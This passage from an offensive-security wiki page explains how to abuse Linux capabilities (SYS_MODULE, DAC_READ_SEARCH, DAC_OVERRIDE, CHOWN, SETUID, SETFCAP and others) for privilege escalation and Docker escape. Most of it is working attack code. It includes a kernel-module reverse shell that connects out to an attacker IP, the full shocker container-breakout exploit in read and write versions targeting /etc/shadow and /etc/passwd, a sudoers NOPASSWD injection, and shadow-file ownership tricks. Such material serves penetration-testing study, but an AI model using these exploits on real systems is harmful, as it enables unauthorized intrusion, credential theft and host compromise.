  \ calls)**, offering direct access to the kernel's core operations. This capability presents critical security risks, as\
  \ it enables privilege escalation and total system compromise by allowing modifications to the kernel, thereby bypassing\
  \ all Linux security mechanisms, including Linux Security Modules and container isolation.\n**This means that you can**\
  \ **insert/remove kernel modules in/from the kernel of the host machine.**\n\n**Example with binary**\n\nIn the following\
  \ example the binary **`python`** has this capability.\n\n```bash\ngetcap -r / 2>/dev/null\n/usr/bin/python2.7 = cap_sys_module+ep\n\
  ```\n\nBy default, **`modprobe`** command checks for dependency list and map files in the directory **`/lib/modules/$(uname\
  \ -r)`**.\\\nIn order to abuse this, lets create a fake **lib/modules** folder:\n\n```bash\nmkdir lib/modules -p\ncp -a\
  \ /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)\n```\n\nThen **compile the kernel module you can find 2 examples\
  \ below and copy** it to this folder:\n\n```bash\ncp reverse-shell.ko lib/modules/$(uname -r)/\n```\n\nFinally, execute\
  \ the needed python code to load this kernel module:\n\n```python\nimport kmod\nkm = kmod.Kmod()\nkm.set_mod_dir(\"/path/to/fake/lib/modules/5.0.0-20-generic/\"\
  )\nkm.modprobe(\"reverse-shell\")\n```\n\n**Example 2 with binary**\n\nIn the following example the binary **`kmod`** has\
  \ this capability.\n\n```bash\ngetcap -r / 2>/dev/null\n/bin/kmod = cap_sys_module+ep\n```\n\nWhich means that it's possible\
  \ to use the command **`insmod`** to insert a kernel module. Follow the example below to get a **reverse shell** abusing\
  \ this privilege.\n\n**Example with environment (Docker breakout)**\n\nYou can check the enabled capabilities inside the\
  \ docker container using:\n\n```bash\ncapsh --print\nCurrent: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep\n\
  Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap\n\
  Securebits: 00/0x0/1'b0\n secure-noroot: no (unlocked)\n secure-no-suid-fixup: no (unlocked)\n secure-keep-caps: no (unlocked)\n\
  uid=0(root)\ngid=0(root)\ngroups=0(root)\n```\n\nInside the previous output you can see that the **SYS_MODULE** capability\
  \ is enabled.\n\n**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile**\
  \ it:\n\n```c:reverse-shell.c\n#include <linux/kmod.h>\n#include <linux/module.h>\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"\
  AttackDefense\");\nMODULE_DESCRIPTION(\"LKM reverse shell module\");\nMODULE_VERSION(\"1.0\");\n\nchar* argv[] = {\"/bin/bash\"\
  ,\"-c\",\"bash -i >& /dev/tcp/10.10.14.8/4444 0>&1\", NULL};\nstatic char* envp[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\
  , NULL };\n\n// call_usermodehelper function is used to create user mode processes from kernel space\nstatic int __init\
  \ reverse_shell_init(void) {\n    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n}\n\nstatic void __exit\
  \ reverse_shell_exit(void) {\n    printk(KERN_INFO \"Exiting\\n\");\n}\n\nmodule_init(reverse_shell_init);\nmodule_exit(reverse_shell_exit);\n\
  ```\n\n```bash:Makefile\nobj-m +=reverse-shell.o\n\nall:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\
  \nclean:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n```\n\n> [!WARNING]\n> The blank char before\
  \ each make word in the Makefile **must be a tab, not spaces**!\n\nExecute `make` to compile it.\n\n```bash\nMake[1]: ***\
  \ /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.\n\nsudo apt update\nsudo apt full-upgrade\n```\n\
  \nFinally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:\n\
  \n```bash\n#Shell 1\nnc -lvnp 4444\n\n#Shell 2\ninsmod reverse-shell.ko #Launch the reverse shell\n```\n\n**The code of\
  \ this technique was copied from the laboratory of \"Abusing SYS_MODULE Capability\" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)\n\
  \nAnother example of this technique can be found in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)\n\
  \n## CAP_DAC_READ_SEARCH\n\n[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables\
  \ a process to **bypass permissions for reading files and for reading and executing directories**. Its primary use is for\
  \ file searching or reading purposes. However, it also allows a process to use the `open_by_handle_at(2)` function, which\
  \ can access any file, including those outside the process's mount namespace. The handle used in `open_by_handle_at(2)`\
  \ is supposed to be a non-transparent identifier obtained through `name_to_handle_at(2)`, but it can include sensitive information\
  \ like inode numbers that are vulnerable to tampering. The potential for exploitation of this capability, particularly in\
  \ the context of Docker containers, was demonstrated by Sebastian Krahmer with the shocker exploit, as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).\n\
  **This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**\n\
  \n**Example with binary**\n\nThe binary will be able to read any file. So, if a file like tar has this capability it will\
  \ be able to read the shadow file:\n\n```bash\ncd /etc\ntar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp\n\
  cd /tmp\ntar -cxf shadow.tar.gz\n```\n\n**Example with binary2**\n\nIn this case lets suppose that **`python`** binary has\
  \ this capability. In order to list root files you could do:\n\n```python\nimport os\nfor r, d, f in os.walk('/root'):\n\
  \    for filename in f:\n        print(filename)\n```\n\nAnd in order to read a file you could do:\n\n```python\nprint(open(\"\
  /etc/shadow\", \"r\").read())\n```\n\n**Example in Environment (Docker breakout)**\n\nYou can check the enabled capabilities\
  \ inside the docker container using:\n\n```\ncapsh --print\nCurrent: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep\n\
  Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap\n\
  Securebits: 00/0x0/1'b0\n secure-noroot: no (unlocked)\n secure-no-suid-fixup: no (unlocked)\n secure-keep-caps: no (unlocked)\n\
  uid=0(root)\ngid=0(root)\ngroups=0(root)\n```\n\nInside the previous output you can see that the **DAC_READ_SEARCH** capability\
  \ is enabled. As a result, the container can **debug processes**.\n\nYou can learn how the following exploiting works in\
  \ [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)\
  \ but in resume **CAP_DAC_READ_SEARCH** not only allows us to traverse the file system without permission checks, but also\
  \ explicitly removes any checks to _**open_by_handle_at(2)**_ and **could allow our process to sensitive files opened by\
  \ other processes**.\n\nThe original exploit that abuse this permissions to read files from the host can be found here:\
  \ [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified\
  \ version that allows you to indicate the file you want to read as first argument and dump it in a file.**\n\n```c\n#include\
  \ <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <stdlib.h>\n\
  #include <string.h>\n#include <unistd.h>\n#include <dirent.h>\n#include <stdint.h>\n\n// gcc shocker.c -o shocker\n// ./socker\
  \ /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir\n\nstruct my_file_handle\
  \ {\n    unsigned int handle_bytes;\n    int handle_type;\n    unsigned char f_handle[8];\n};\n\nvoid die(const char *msg)\n\
  {\n    perror(msg);\n    exit(errno);\n}\n\nvoid dump_handle(const struct my_file_handle *h)\n{\n    fprintf(stderr,\"[*]\
  \ #=%d, %d, char nh[] = {\", h->handle_bytes,\n    h->handle_type);\n    for (int i = 0; i < h->handle_bytes; ++i) {\n \
  \       fprintf(stderr,\"0x%02x\", h->f_handle[i]);\n        if ((i + 1) % 20 == 0)\n        fprintf(stderr,\"\\n\");\n\
  \        if (i < h->handle_bytes - 1)\n        fprintf(stderr,\", \");\n    }\n    fprintf(stderr,\"};\\n\");\n}\n\nint\
  \ find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle\n*oh)\n{\n    int fd;\n\
  \    uint32_t ino = 0;\n    struct my_file_handle outh = {\n    .handle_bytes = 8,\n    .handle_type = 1\n    };\n    DIR\
  \ *dir = NULL;\n    struct dirent *de = NULL;\n    path = strchr(path, '/');\n    // recursion stops if path has been resolved\n\
  \    if (!path) {\n        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));\n        oh->handle_type = 1;\n   \
  \     oh->handle_bytes = 8;\n        return 1;\n    }\n\n    ++path;\n    fprintf(stderr, \"[*] Resolving '%s'\\n\", path);\n\
  \    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)\n        die(\"[-] open_by_handle_at\");\n\
  \    if ((dir = fdopendir(fd)) == NULL)\n        die(\"[-] fdopendir\");\n    for (;;) {\n        de = readdir(dir);\n \
  \       if (!de)\n        break;\n        fprintf(stderr, \"[*] Found %s\\n\", de->d_name);\n        if (strncmp(de->d_name,\
  \ path, strlen(de->d_name)) == 0) {\n            fprintf(stderr, \"[+] Match: %s ino=%d\\n\", de->d_name, (int)de->d_ino);\n\
  \            ino = de->d_ino;\n            break;\n        }\n    }\n\n    fprintf(stderr, \"[*] Brute forcing remaining\
  \ 32bit. This can take a while...\\n\");\n    if (de) {\n        for (uint32_t i = 0; i < 0xffffffff; ++i) {\n         \
  \   outh.handle_bytes = 8;\n            outh.handle_type = 1;\n            memcpy(outh.f_handle, &ino, sizeof(ino));\n \
  \           memcpy(outh.f_handle + 4, &i, sizeof(i));\n            if ((i % (1<<20)) == 0)\n                fprintf(stderr,\
  \ \"[*] (%s) Trying: 0x%08x\\n\", de->d_name, i);\n            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0)\
  \ > 0) {\n                closedir(dir);\n                close(fd);\n                dump_handle(&outh);\n            \
  \    return find_handle(bfd, path, &outh, oh);\n            }\n        }\n    }\n    closedir(dir);\n    close(fd);\n  \
  \  return 0;\n}\n\n\nint main(int argc,char* argv[] )\n{\n    char buf[0x1000];\n    int fd1, fd2;\n    struct my_file_handle\
  \ h;\n    struct my_file_handle root_h = {\n        .handle_bytes = 8,\n        .handle_type = 1,\n        .f_handle = {0x02,\
  \ 0, 0, 0, 0, 0, 0, 0}\n    };\n\n    fprintf(stderr, \"[***] docker VMM-container breakout Po(C) 2014 [***]\\n\"\n    \"\
  [***] The tea from the 90's kicks your sekurity again. [***]\\n\"\n    \"[***] If you have pending sec consulting, I'll\
  \ happily [***]\\n\"\n    \"[***] forward to my friends who drink secury-tea too! [***]\\n\\n<enter>\\n\");\n\n    read(0,\
  \ buf, 1);\n\n    // get a FS reference from something mounted in from outside\n    if ((fd1 = open(\"/etc/hostname\", O_RDONLY))\
  \ < 0)\n        die(\"[-] open\");\n\n    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)\n        die(\"[-] Cannot find\
  \ valid handle!\");\n\n    fprintf(stderr, \"[!] Got a final handle!\\n\");\n    dump_handle(&h);\n\n    if ((fd2 = open_by_handle_at(fd1,\
  \ (struct file_handle *)&h, O_RDONLY)) < 0)\n        die(\"[-] open_by_handle\");\n\n    memset(buf, 0, sizeof(buf));\n\
  \    if (read(fd2, buf, sizeof(buf) - 1) < 0)\n        die(\"[-] read\");\n\n    printf(\"Success!!\\n\");\n\n    FILE *fptr;\n\
  \    fptr = fopen(argv[2], \"w\");\n    fprintf(fptr,\"%s\", buf);\n    fclose(fptr);\n\n    close(fd2); close(fd1);\n\n\
  \    return 0;\n}\n```\n\n> [!WARNING]\n> The exploit needs to find a pointer to something mounted on the host. The original\
  \ exploit used the file /.dockerinit and this modified version uses /etc/hostname. If the exploit isn't working maybe you\
  \ need to set a different file. To find a file that is mounted in the host just execute mount command:\n\n![](<../../images/image\
  \ (407) (1).png>)\n\n**The code of this technique was copied from the laboratory of \"Abusing DAC_READ_SEARCH Capability\"\
  \ from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)\n\n\n## CAP_DAC_OVERRIDE\n\n**This mean\
  \ that you can bypass write permission checks on any file, so you can write any file.**\n\nThere are a lot of files you\
  \ can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).\n\
  \n**Example with binary**\n\nIn this example vim has this capability, so you can modify any file like _passwd_, _sudoers_\
  \ or _shadow_:\n\n```bash\ngetcap -r / 2>/dev/null\n/usr/bin/vim = cap_dac_override+ep\n\nvim /etc/sudoers #To overwrite\
  \ it\n```\n\n**Example with binary 2**\n\nIn this example **`python`** binary will have this capability. You could use python\
  \ to override any file:\n\n```python\nfile=open(\"/etc/sudoers\",\"a\")\nfile.write(\"yourusername ALL=(ALL) NOPASSWD:ALL\"\
  )\nfile.close()\n```\n\n**Example with environment + CAP_DAC_READ_SEARCH (Docker breakout)**\n\nYou can check the enabled\
  \ capabilities inside the docker container using:\n\n```bash\ncapsh --print\nCurrent: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep\n\
  Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap\n\
  Securebits: 00/0x0/1'b0\n secure-noroot: no (unlocked)\n secure-no-suid-fixup: no (unlocked)\n secure-keep-caps: no (unlocked)\n\
  uid=0(root)\ngid=0(root)\ngroups=0(root)\n```\n\nFirst of all read the previous section that [**abuses DAC_READ_SEARCH capability\
  \ to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) of the host and **compile** the exploit.\\\nThen,\
  \ **compile the following version of the shocker exploit** that will allow you to **write arbitrary files** inside the hosts\
  \ filesystem:\n\n```c\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <errno.h>\n\
  #include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <dirent.h>\n#include <stdint.h>\n\n// gcc shocker_write.c\
  \ -o shocker_write\n// ./shocker_write /etc/passwd passwd\n\nstruct my_file_handle {\n  unsigned int handle_bytes;\n  int\
  \ handle_type;\n  unsigned char f_handle[8];\n};\nvoid die(const char * msg) {\n  perror(msg);\n  exit(errno);\n}\nvoid\
  \ dump_handle(const struct my_file_handle * h) {\n  fprintf(stderr, \"[*] #=%d, %d, char nh[] = {\", h -> handle_bytes,\n\
  \    h -> handle_type);\n  for (int i = 0; i < h -> handle_bytes; ++i) {\n    fprintf(stderr, \"0x%02x\", h -> f_handle[i]);\n\
  \    if ((i + 1) % 20 == 0)\n      fprintf(stderr, \"\\n\");\n    if (i < h -> handle_bytes - 1)\n      fprintf(stderr,\
  \ \", \");\n  }\n  fprintf(stderr, \"};\\n\");\n}\nint find_handle(int bfd, const char *path, const struct my_file_handle\
  \ *ih, struct my_file_handle *oh)\n{\n  int fd;\n  uint32_t ino = 0;\n  struct my_file_handle outh = {\n    .handle_bytes\
  \ = 8,\n    .handle_type = 1\n  };\n  DIR * dir = NULL;\n  struct dirent * de = NULL;\n  path = strchr(path, '/');\n  //\
  \ recursion stops if path has been resolved\n  if (!path) {\n    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));\n\
  \    oh -> handle_type = 1;\n    oh -> handle_bytes = 8;\n    return 1;\n  }\n  ++path;\n  fprintf(stderr, \"[*] Resolving\
  \ '%s'\\n\", path);\n  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)\n    die(\"[-] open_by_handle_at\"\
  );\n  if ((dir = fdopendir(fd)) == NULL)\n    die(\"[-] fdopendir\");\n  for (;;) {\n    de = readdir(dir);\n    if (!de)\n\
  \      break;\n    fprintf(stderr, \"[*] Found %s\\n\", de -> d_name);\n    if (strncmp(de -> d_name, path, strlen(de ->\
  \ d_name)) == 0) {\n      fprintf(stderr, \"[+] Match: %s ino=%d\\n\", de -> d_name, (int) de -> d_ino);\n      ino = de\
  \ -> d_ino;\n      break;\n    }\n  }\n  fprintf(stderr, \"[*] Brute forcing remaining 32bit. This can take a while...\\\
  n\");\n  if (de) {\n    for (uint32_t i = 0; i < 0xffffffff; ++i) {\n      outh.handle_bytes = 8;\n      outh.handle_type\
  \ = 1;\n      memcpy(outh.f_handle, & ino, sizeof(ino));\n      memcpy(outh.f_handle + 4, & i, sizeof(i));\n      if ((i\
  \ % (1 << 20)) == 0)\n        fprintf(stderr, \"[*] (%s) Trying: 0x%08x\\n\", de -> d_name, i);\n      if (open_by_handle_at(bfd,\
  \ (struct file_handle * ) & outh, 0) > 0) {\n        closedir(dir);\n        close(fd);\n        dump_handle( & outh);\n\
  \        return find_handle(bfd, path, & outh, oh);\n      }\n    }\n  }\n  closedir(dir);\n  close(fd);\n  return 0;\n\
  }\nint main(int argc, char * argv[]) {\n  char buf[0x1000];\n  int fd1, fd2;\n  struct my_file_handle h;\n  struct my_file_handle\
  \ root_h = {\n    .handle_bytes = 8,\n    .handle_type = 1,\n    .f_handle = {\n      0x02,\n      0,\n      0,\n      0,\n\
  \      0,\n      0,\n      0,\n      0\n    }\n  };\n  fprintf(stderr, \"[***] docker VMM-container breakout Po(C) 2014\
  \ [***]\\n\"\n    \"[***] The tea from the 90's kicks your sekurity again. [***]\\n\"\n    \"[***] If you have pending sec\
  \ consulting, I'll happily [***]\\n\"\n    \"[***] forward to my friends who drink secury-tea too! [***]\\n\\n<enter>\\\
  n\");\n  read(0, buf, 1);\n  // get a FS reference from something mounted in from outside\n  if ((fd1 = open(\"/etc/hostname\"\
  , O_RDONLY)) < 0)\n    die(\"[-] open\");\n  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)\n    die(\"[-] Cannot find\
  \ valid handle!\");\n  fprintf(stderr, \"[!] Got a final handle!\\n\");\n  dump_handle( & h);\n  if ((fd2 = open_by_handle_at(fd1,\
  \ (struct file_handle * ) & h, O_RDWR)) < 0)\n    die(\"[-] open_by_handle\");\n  char * line = NULL;\n  size_t len = 0;\n\
  \  FILE * fptr;\n  ssize_t read;\n  fptr = fopen(argv[2], \"r\");\n  while ((read = getline( & line, & len, fptr)) != -1)\
  \ {\n    write(fd2, line, read);\n  }\n  printf(\"Success!!\\n\");\n  close(fd2);\n  close(fd1);\n  return 0;\n}\n```\n\n\
  In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add**\
  \ to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.\n\n**The code of\
  \ this technique was copied from the laboratory of \"Abusing DAC_OVERRIDE Capability\" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)\n\
  \n## CAP_CHOWN\n\n**This means that it's possible to change the ownership of any file.**\n\n**Example with binary**\n\n\
  Lets suppose the **`python`** binary has this capability, you can **change** the **owner** of the **shadow** file, **change\
  \ root password**, and escalate privileges:\n\n```bash\npython -c 'import os;os.chown(\"/etc/shadow\",1000,1000)'\n```\n\
  \nOr with the **`ruby`** binary having this capability:\n\n```bash\nruby -e 'require \"fileutils\"; FileUtils.chown(1000,\
  \ 1000, \"/etc/shadow\")'\n```\n\n## CAP_FOWNER\n\n**This means that it's possible to change the permission of any file.**\n\
  \n**Example with binary**\n\nIf python has this capability you can modify the permissions of the shadow file, **change root\
  \ password**, and escalate privileges:\n\n```bash\npython -c 'import os;os.chmod(\"/etc/shadow\",0666)\n```\n\n### CAP_SETUID\n\
  \n**This means that it's possible to set the effective user id of the created process.**\n\n**Example with binary**\n\n\
  If python has this **capability**, you can very easily abuse it to escalate privileges to root:\n\n```python\nimport os\n\
  os.setuid(0)\nos.system(\"/bin/bash\")\n```\n\n**Another way:**\n\n```python\nimport os\nimport prctl\n#add the capability\
  \ to the effective set\nprctl.cap_effective.setuid = True\nos.setuid(0)\nos.system(\"/bin/bash\")\n```\n\n## CAP_SETGID\n\
  \n**This means that it's possible to set the effective group id of the created process.**\n\nThere are a lot of files you\
  \ can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).\n\
  \n**Example with binary**\n\nIn this case you should look for interesting files that a group can read because you can impersonate\
  \ any group:\n\n```bash\n#Find every file writable by a group\nfind / -perm /g=w -exec ls -lLd {} \\; 2>/dev/null\n#Find\
  \ every file writable by a group in /etc with a maxpath of 1\nfind /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \\; 2>/dev/null\n\
  #Find every file readable by a group in /etc with a maxpath of 1\nfind /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \\;\
  \ 2>/dev/null\n```\n\nOnce you have find a file you can abuse (via reading or writing) to escalate privileges you can **get\
  \ a shell impersonating the interesting group** with:\n\n```python\nimport os\nos.setgid(42)\nos.system(\"/bin/bash\")\n\
  ```\n\nIn this case the group shadow was impersonated so you can read the file `/etc/shadow`:\n\n```bash\ncat /etc/shadow\n\
  ```\n\n### Combined chain: CAP_SETGID + CAP_CHOWN\n\nWhen both capabilities are available in the same helper, a practical\
  \ chain is:\n\n1. Switch EGID to `shadow` (or another privileged group).\n2. Use `chown` on `/etc/shadow` to set your UID\
  \ while keeping group `shadow`.\n3. Read a target hash and crack/pivot.\n\n```python\nimport os\n\n# Replace values with\
  \ real IDs from `id` / `getent group shadow`\nLAB_UID = 1000\nSHADOW_GID = 42\n\nos.setgid(SHADOW_GID)\nos.chown(\"/etc/shadow\"\
  , LAB_UID, SHADOW_GID)\nos.system(\"grep '^root:' /etc/shadow > /tmp/root.hash\")\n```\n\nThis avoids needing full root\
  \ directly and is commonly enough to pivot through credential reuse.\n\nIf **docker** is installed you could **impersonate**\
  \ the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](#writable-docker-socket).\n\
  \n## CAP_SETFCAP\n\n**This means that it's possible to set capabilities on files and processes**\n\n**Example with binary**\n\
  \nIf python has this **capability**, you can very easily abuse it to escalate privileges to root:\n\n```python:setcapability.py\n\
  import ctypes, sys\n\n#Load needed library\n#You can find which library you need to load checking the libraries of local\
  \ setcap binary\n# ldd /sbin/setcap\nlibcap = ctypes.cdll.LoadLibrary(\"libcap.so.2\")\n\nlibcap.cap_from_text.argtypes\
  \ = [ctypes.c_char_p]\nlibcap.cap_from_text.restype = ctypes.c_void_p\nlibcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]\n\
  \n#Give setuid cap to the binary\ncap = 'cap_setuid+ep'\npath = sys.argv[1]\nprint(path)\ncap_t = libcap.cap_from_text(cap)\n\
  status = libcap.cap_set_file(path,cap_t)\n\nif(status == 0):\n    print (cap + \" was successfully added to \" + path)\n\
  ```\n\n```bash\npython setcapability.py /usr/bin/python2.7\n```\n\n> [!WARNING]\n> Note that if you set a new capability\
  \ to the binary with CAP_SETFCAP, you will lose this cap.\n\nOnce you have [SETUID capability](linux-capabilities.md#cap_setuid)\
  \ you can go to its section to see how to escalate privileges.\n\n**Example with environment (Docker breakout)**\n\nBy default\
  \ the capability **CAP_SETFCAP is given to the proccess inside the container in Docker**. You can check that doing something\
  \ like:\n\n```bash\ncat /proc/`pidof bash`/status | grep Cap\nCapInh: 00000000a80425fb\nCapPrm: 00000000a80425fb\nCapEff:\
  \ 00000000a80425fb\nCapBnd: 00000000a80425fb\nCapAmb: 0000000000000000\n\ncapsh --decode=00000000a80425fb\n0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap\n\
  ```\n\nThis capability allow to **give any other capability to binaries**, so we could think about **escaping** from the\
  \ container **abusing any of the other capability breakouts** mentioned in this page.\\\nHowever, if you try to give for\
  \ example the capabilities CAP_SYS_ADMIN and CAP_SYS_PTRACE to the gdb binary, you will find that you can give them, but\
  \ the **binary won’t be able to execute after this**:\n\n```bash\ngetcap /usr/bin/gdb\n/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip\n\
  \nsetcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb\n\n/usr/bin/gdb\nbash: /usr/bin/gdb: Operation not permitted\n```\n\
  \n[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: This is a **limiting superset\
  \ for the effective capabilities** that the thread may assume. It is also a limiting superset for the capabilities that\
  \ may be added to the inheri‐table set by a thread that **does not have the CAP_SETPCAP** capability in its effective set._\\\
  \nIt looks like the Permitted capabilities limit the ones that can be used.\\\nHowever, Docker also grants the **CAP_SETPCAP**\
  \ by default, so you might be able to **set new capabilities inside the inheritables ones**.\\\nHowever, in the documentation\
  \ of this cap: _CAP_SETPCAP : \\[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\\\
  \nIt looks like we can only add to the inheritable set capabilities from the bounding set. Which means that **we cannot\
  \ put new capabilities like CAP_SYS_ADMIN or CAP_SYS_PTRACE in the inherit set to escalate privileges**.\n\n## CAP_SYS_RAWIO\n\
  \n[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) provides a number of sensitive operations\
  \ including access to `/dev/mem`, `/dev/kmem` or `/proc/kcore`, modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)`\
  \ system calls, and various disk commands. The `FIBMAP ioctl(2)` is also enabled via this capability, which has caused issues\
  \ in the [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). As per the man page, this also allows the holder\
  \ to descriptively `perform a range of device-specific operations on other devices`.\n\nThis can be useful for **privilege\
  \ escalation** and **Docker breakout.**\n\n## CAP_KILL\n\n**This means that it's possible to kill any process.**\n\n**Example\
  \ with binary**\n\nLets suppose the **`python`** binary has this capability. If you could **also modify some service or\
  \ socket configuration** (or any configuration file related to a service) file, you could backdoor it, and then kill the\
  \ process related to that service and wait for the new configuration file to be executed with your backdoor.\n\n```python\n\
  #Use this python code to kill arbitrary processes\nimport os\nimport signal\npgid = os.getpgid(341)\nos.killpg(pgid, signal.SIGKILL)\n\
  ```\n\n**Privesc with kill**\n\nIf you have kill capabilities and there is a **node program running as root** (or as a different\
  \ user)you could probably **send** it the **signal SIGUSR1** and make it **open the node debugger** to where you can connect.\n\
  \n```bash\nkill -s SIGUSR1 <nodejs-ps>\n# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d\n\
  ```\n\n\n{{#ref}}\nelectron-cef-chromium-debugger-abuse.md\n{{#endref}}\n\n\n## CAP_NET_BIND_SERVICE\n\n**This means that\
  \ it's possible to listen in any port (even in privileged ones).** You cannot escalate privileges directly with this capability.\n\
  \n**Example with binary**\n\nIf **`python`** has this capability it will be able to listen on any port and even connect\
  \ from it to any other port (some services require connections from specific privileges ports)\n\n{{#tabs}}\n{{#tab name=\"\
  Listen\"}}\n\n```python\nimport socket\ns=socket.socket()\ns.bind(('0.0.0.0', 80))\ns.listen(1)\nconn, addr = s.accept()\n\
  while True:\n        output = connection.recv(1024).strip();\n        print(output)\n```\n\n{{#endtab}}\n\n{{#tab name=\"\
  Connect\"}}\n\n```python\nimport socket\ns=socket.socket()\ns.bind(('0.0.0.0',500))\ns.connect(('10.10.10.10',500))\n```\n\
  \n{{#endtab}}\n{{#endtabs}}\n\n## CAP_NET_RAW\n\n[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html)\
  \ capability permits processes to **create RAW and PACKET sockets**, enabling them to generate and send arbitrary network\
  \ packets. This can lead to security risks in containerized environments, such as packet spoofing, traffic injection, and\
  \ bypassing network access controls. Malicious actors could exploit this to interfere with container routing or compromise\
  \ host network security, especially without adequate firewall protections. Additionally, **CAP_NET_RAW** is crucial for\
  \ privileged containers to support operations like ping via RAW ICMP requests.\n\n**This means that it's possible to sniff\
  \ traffic.** You cannot escalate privileges directly with this capability.\n\n**Example with binary**\n\nIf the binary **`tcpdump`**\
  \ has this capability you will be able to use it to capture network information.\n\n```bash\ngetcap -r / 2>/dev/null\n/usr/sbin/tcpdump\
  \ = cap_net_raw+ep\n```\n\nNote that if the **environment** is giving this capability you could also use **`tcpdump`** to\
  \ sniff traffic.\n\n**Example with binary 2**\n\nThe following example is **`python2`** code that can be useful to intercept\
  \ traffic of the \"**lo**\" (**localhost**) interface. The code is from the lab \"_The Basics: CAP-NET_BIND + NET_RAW_\"\
  \ from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)\n\n```python\nimport socket\n\
  import struct\n\nflags=[\"NS\",\"CWR\",\"ECE\",\"URG\",\"ACK\",\"PSH\",\"RST\",\"SYN\",\"FIN\"]\n\ndef getFlag(flag_value):\n\
  \    flag=\"\"\n    for i in xrange(8,-1,-1):\n        if( flag_value & 1 <<i ):\n            flag= flag + flags[8-i] +\
